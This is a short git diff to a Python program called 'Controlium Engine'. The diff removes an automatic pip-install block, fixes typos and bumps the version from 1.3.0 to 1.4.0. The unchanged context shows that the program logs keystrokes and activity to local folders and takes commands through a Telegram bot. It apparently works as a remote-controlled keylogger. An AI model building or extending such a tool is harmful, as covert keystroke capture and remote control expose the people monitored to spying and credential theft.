@@ -6,16 +6,6 @@ import socket
 import datetime
 import subprocess
 import threading
-import importlib
-
-packages = ["psutil", "pyperclip", "telebot", "requests", "winshell", "webbrowser", "pyttsx3", "pygetwindow", "pynput", "plyer"]
-
-for pkg in packages:
-    if importlib.util.find_spec(pkg) is None:
-        subprocess.check_call(["pip", "install", pkg])
-    else:
-        pass
-
 import psutil
 import pyperclip
 import telebot
@@ -44,11 +34,10 @@ def telegram_alert(send):
     response = requests.get(send_text)
     return response.json()
 
-
 def win_notification(message):
     msg = message.text
     notification.notify(
-        title="Windows Notification",
+        title="Windows notification",
         message=msg,
         app_icon=None,
         timeout=5,)
@@ -65,7 +54,7 @@ def command_engine(message):
         elif message.text.lower() == "stop":
             notification.notify(
                 title="Controlium Engine",
-                message="Program Termianted",
+                message="Program terminated",
                 app_icon=None,
                 timeout=3,)
             
@@ -207,7 +196,6 @@ folder2 = os.path.exists("Keystroke Logs")
 if folder2 == False:
     os.mkdir("Keystroke Logs")
 
-
 date = datetime.datetime.now().strftime(f"%h{'('}%d{')'}:%H:%M")
 log_file = str(date).replace(":", "-") + "-Log.txt"
 folder = "Activity Logs"
@@ -265,7 +253,7 @@ def key_release(key):
 def log_keystrokes():
     time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
     with open(key_log_file, "a") as f:
-        f.write(f'''CONTROLIUM ENGINE v1.3.0
+        f.write(f'''CONTROLIUM ENGINE v1.4.0
 {str(time_stamp)}
 << KEYSTROKE LOG >>
 
@@ -285,7 +273,7 @@ def log_keystrokes():
 
 def log_activity():
     time_stamp = datetime.datetime.now().strftime("%D:%h:%H:%M:%S")
-    logging.info(f'''CONTROLIUM ENGINE v1.3.0
+    logging.info(f'''CONTROLIUM ENGINE v1.4.0
 {str(time_stamp)}
 << ACTIVITY LOG >>
 
@@ -334,12 +322,6 @@ def speech_engine(speak):
     engine.runAndWait()
 
 
-def time_info():
-    time = datetime.datetime.now().strftime("%H:%M")
-    speech_engine(f"The time is {time} AM")
-
-##########################################################################################
-
 def telegram_bot():
     while True:
         try:
@@ -348,6 +330,7 @@ def telegram_bot():
         except:
             time.sleep(5)
 
+##########################################################################################
 
 if __name__ == "__main__":
     keystroke_thread = threading.Thread(target=log_keystrokes)
